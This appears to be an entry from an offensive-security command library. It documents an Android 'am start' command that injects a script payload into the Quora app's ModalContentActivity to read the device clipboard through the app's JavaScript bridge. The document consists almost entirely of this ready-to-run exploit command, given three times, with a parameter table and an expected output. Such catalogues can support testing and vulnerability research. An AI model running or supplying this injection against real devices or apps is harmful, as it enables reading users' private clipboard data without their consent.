---
data: >-
  am start -n com.quora.android/com.quora.android.ModalContentActivity -e url
  'http://test/test' -e html
  '<script>alert(QuoraAndroid.getClipboardData());</script>'
tags:
  - xss
  - jsbridge
type: command
executor: bash
platforms:
  - Android
id: c7ef21d3-1a3c-4a17-b35d-3a82a0a0656a
created_at: '2025-12-13T23:52:44.008Z'
updated_at: '2025-12-13T23:52:44.008Z'
verified: false
validated: true
submitted: true
---
# am-start-modal-jsbridge-clipboard

## Command

```bash
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
```

## Description

Launches ModalContentActivity to access clipboard via JSBridge.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Component name | Yes |
| -e url | Dummy URL | Yes |
| -e html | JSBridge call payload | Yes |

## Examples

### Basic Usage

```bash
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
```

## Expected Output

Alert with clipboard data.

## Related

- [[procedures/Access-Quora-JSBridge-to-Read-Clipboard-Data-via-XSS]]
